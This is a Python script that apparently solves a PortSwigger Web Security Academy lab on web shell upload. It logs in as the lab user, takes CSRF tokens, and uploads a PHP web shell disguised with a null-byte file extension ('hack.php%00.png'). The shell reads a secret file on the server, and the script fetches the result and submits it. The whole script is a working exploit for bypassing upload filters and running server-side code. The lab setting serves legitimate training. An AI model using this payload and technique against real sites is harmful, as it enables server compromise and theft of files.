#################################################################
#
# Lab: Web shell upload via obfuscated file extension
#
# Hack Steps: 
#      1. Fetch login page
#      2. Extract the csrf token and session cookie
#      3. Login as wiener
#      4. Extract the new csrf token from wiener profile
#      5. Upload the shell file via obfuscated file extension
#      6. Fetch the uploaded shell file to read the secret
#      7. Submit the solution
#
#################################################################
import requests
import re
from colorama import Fore

# Change this to your lab URL
LAB_URL = "https://0a52008b037eaa8380d2d0be00cf0070.web-security-academy.net"

def main():
    print("⦗1⦘ Fetching the login page.. ", end="", flush=True)
  
    login_page = fetch("/login")

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗2⦘ Extracting the csrf token and session cookie.. ", end="", flush=True)

    session = login_page.cookies.get("session")
    csrf_token = re.findall("csrf.+value=\"(.+)\"", login_page.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗3⦘ Logging in as wiener.. ", end="", flush=True)

    data = { "username": "wiener", "password": "peter", "csrf": csrf_token }
    cookies = { "session": session }
    login_as_wiener = post_data("/login", data, cookies)
 
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗4⦘ Extracting the new csrf token from wiener profile.. ", end="", flush=True)

    session = login_as_wiener.cookies.get("session")
    cookies = { "session": session }
    wiener_profile = fetch("/my-account", cookies)
    csrf_token = re.findall("csrf.+value=\"(.+)\"", wiener_profile.text)[0]

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗5⦘ Uploading the shell file via obfuscated file extension.. ", end="", flush=True)
    
    shell_file = """<?php echo file_get_contents("/home/carlos/secret") ?>"""
    shell_file_name = "hack.php" # You can change this to what you want
    files = { "avatar": (f"{shell_file_name}%00.png", shell_file, "application/x-php") }
    data = { "user": "wiener", "csrf": csrf_token }
    post_data("/my-account/avatar", data, cookies, files)
    
    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "⦗6⦘ Fetching the uploaded shell file to read the secret.. ", end="", flush=True)

    uploaded_shell = fetch(f"/files/avatars/{shell_file_name}", cookies)
    secret = uploaded_shell.text

    print(Fore.GREEN + "OK")
    print(Fore.BLUE + "❯❯ Secret: " + Fore.YELLOW + secret)
    print(Fore.WHITE + "⦗7⦘ Submitting the solution.. ", end="", flush=True)

    data = { "answer": secret }
    post_data("/submitSolution", data)

    print(Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 The lab should be marked now as " + Fore.GREEN + "solved")


def fetch(path, cookies = None):
    try:  
        return requests.get(f"{LAB_URL}{path}", cookies=cookies, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to fetch " + path + " through exception")
        exit(1)


def post_data(path, data, cookies = None, files = None):
    try:    
        return requests.post(f"{LAB_URL}{path}", data, cookies=cookies, files=files, allow_redirects=False)
    except:
        print(Fore.RED + "⦗!⦘ Failed to post data to " + path + " through exception")
        exit(1)


if __name__ == "__main__":
    main()

